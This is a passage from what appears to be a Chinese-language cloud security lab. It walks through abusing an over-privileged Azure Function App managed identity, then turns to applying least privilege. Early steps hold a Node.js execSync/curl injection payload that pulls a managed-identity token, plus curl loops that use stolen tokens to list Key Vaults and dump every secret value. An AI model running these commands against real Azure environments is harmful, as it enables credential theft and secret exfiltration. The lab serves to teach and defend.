

```
require("child_process").execSync(
   `curl -s -H "X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}"
   "${process.env.IDENTITY_ENDPOINT}
   ?resource=https://vault.azure.net/&api-version=2019-08-01"`,
   { encoding: "utf8" }
);
```

这会产生以下 JSON 输出：

```
{
  "access_token": "...",
  "expires_on": "...",
  "resource": "https://vault.azure.net/",
  "token_type": "Bearer",
  "client_id": "..."
}
```

### Note

此时，你本地机器中的参考文本文件应包含以下额外值：`ACCESS_TOKEN`、`ACCESS_TOKEN_2`。

输入 `exit` 并按 Enter 停止脚本并返回到命令行。

3. 从你的参考文本文件中复制第一个访问令牌值（TAG：`ACCESS_TOKEN`）并将其存储在 Cloud Shell 终端中的环境变量（`ACCESS_TOKEN`）中：

```
ACCESS_TOKEN="[SPECIFY ACCESS TOKEN]"
```

4. 从你的参考文本文件中复制第二个访问令牌值（TAG：`ACCESS_TOKEN_2`）并将其存储在 Cloud Shell 终端中的环境变量（`ACCESS_TOKEN_2`）中：

```
ACCESS_TOKEN_2="[SPECIFY ACCESS TOKEN]"
```

5. 使用第一个获取的访问令牌（`ACCESS_TOKEN`）查询所有 Key Vault：

```
URL_1="https://management.azure.com/subscriptions/$SUBSCRIPTION_ID"
URL_2="providers/Microsoft.KeyVault/vaults?api-version=2022-07-01"
URL="$URL_1/$URL_2"

RESPONSE=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
     -H "Content-Type: application/json" \
     "$URL")

echo $RESPONSE | jq "."
```

这会产生以下输出：

```
{
  "value": [
    {
      "id": "/.../vaults/keyvault...",
      "name": "keyvault...",
      "type": "Microsoft.KeyVault/vaults",
      "location": "eastus",
      "tags": {},
      "systemData": {...},
      "properties": {
        "sku": {
          "family": "A",
          "name": "standard"
        },
        "tenantId": "...",
        "accessPolicies": [],
        "enabledForDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "enableRbacAuthorization": true,
        "vaultUri": "...",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
      }
    }
  ],
  "nextLink": "..."
```

6. 从响应中提取 Key Vault 名称并将其存储在环境变量（`KEYVAULT_NAME`）中：

```
KEYVAULT_NAME=$(echo $RESPONSE | jq -r ".value.[].name")
```

7. 使用另一个访问令牌（`ACCESS_TOKEN_2`）列出 Key Vault 中的所有机密：

```
curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
     -H "Content-Type: application/json" \
     "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5" \
     | jq .
```

这会产生以下 JSON 输出：

```
{
  "value": [
    {
      "id": "https://keyvault....vault.azure.net/secrets/secret00",
      "attributes": {
        "enabled": true,
        "created": ...,
        "updated": ...,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {
        "file-encoding": "utf-8"
      }
    },
    {
      "id": "https://keyvault....vault.azure.net/secrets/secret01",
      "attributes": {
        "enabled": true,
        "created": ...,
        "updated": ...,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
      },
      "tags": {
        "file-encoding": "utf-8"
      }
    }
  ],
  "nextLink": null
}
```

8. 使用第二个访问令牌（`ACCESS_TOKEN_2`）从 Key Vault 中检索所有机密：

```
SECRETS_RESPONSE=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
     -H "Content-Type: application/json" \
     "https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5")

for SECRET_ID in $(echo "$SECRETS_RESPONSE" | jq -r '.value[].id'); do
    curl -s -H "Authorization: Bearer $ACCESS_TOKEN_2" \
         -H "Content-Type: application/json" \
         "${SECRET_ID}?api-version=7.5" | jq '{name: .id, value: .value}'
done
```

这会以类似以下格式输出机密值：

```
{
  "name": "https://keyvault....vault.azure.net/secrets/secret00/...",
  "value": "SECRETABC123"
}
{
  "name": "https://keyvault....vault.azure.net/secrets/secret01/...",
  "value": "SECRETDEF456"
}
```

使用被窃取的访问令牌，你能够修改托管标识的角色分配，赋予其所有者和 Key Vault 机密管理员权限，并访问 Key Vault 中存储的机密。此时，你应该对过度宽松的托管标识如何被用来提升权限并危害敏感资源有很好的了解。

从防御安全角度来看，你应为托管标识和服务主体强制执行最小权限，限制角色分配范围，并监控控制平面活动，以便快速检测和补救滥用情况。你将在下一节中对函数应用关联的托管标识强制执行最小权限。

# 对函数应用托管标识应用最小权限

在本节中，你将通过审查和调整先前授予函数应用托管标识的角色分配，来应用最小权限原则。在确保配置安全后，你将运行一系列恶意测试输入，以确认函数按预期安全地拒绝它们。这类似于将门禁卡限制为员工实际需要访问的房间或楼层，以降低未经授权进入的风险。

让我们逐步进行为无服务器函数关联的托管标识强制执行最小权限的步骤：

1. 切换回浏览器窗口和 Serverless Lab 账户的 Cloud Shell 终端。

2. 通过加载环境变量并运行以下命令，获取函数应用托管标识的主体 ID：

```
source ~/vulnerable-function/function-vars.sh

DETAILS=$(az functionapp identity show \
  --name $FUNCTION_APP \
  --resource-group $RESOURCE_GROUP)

PRINCIPAL_ID=$(echo $DETAILS | jq -r ".principalId")
```

### Tip

运行 `echo $PRINCIPAL_ID` 以打印主体 ID 并确保其已成功检索。

3. 列出函数应用托管标识的所有角色分配以验证其当前权限：

```
az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all \
  -o table
```

这会返回以下值表：

```
Principal  Role                       Scope
---------  -------------------------  -------------------------
...        Contributor                /subscriptions/...
...        User Access Administrator  /subscriptions/...
...        Owner                      /subscriptions/...
...        Key Vault Secrets Officer  /.../vaults/keyvault...
```

4. 以 JSON 格式列出函数应用托管标识的所有角色分配，然后仅显示主体 ID、角色和范围：

```
az role assignment list \
  --assignee $PRINCIPAL_ID \
  --all \
  -o json | \
  jq '[.[] |
        { principal: .principalId,
          role: .roleDefinitionName,
          scope: .scope }]'
```

这会返回以下内容：

